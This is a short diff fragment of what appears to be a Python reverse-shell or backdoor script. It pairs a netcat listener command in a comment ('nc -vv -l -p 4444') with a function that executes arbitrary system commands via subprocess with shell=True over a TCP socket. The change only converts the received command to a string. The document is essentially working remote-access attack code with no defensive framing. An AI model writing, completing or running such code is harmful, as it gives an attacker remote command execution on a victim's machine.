@@ -4,7 +4,7 @@ import subprocess
 # nc -vv -l -p 4444
 
 def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+    return subprocess.check_output(str(command), shell=True)
 
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
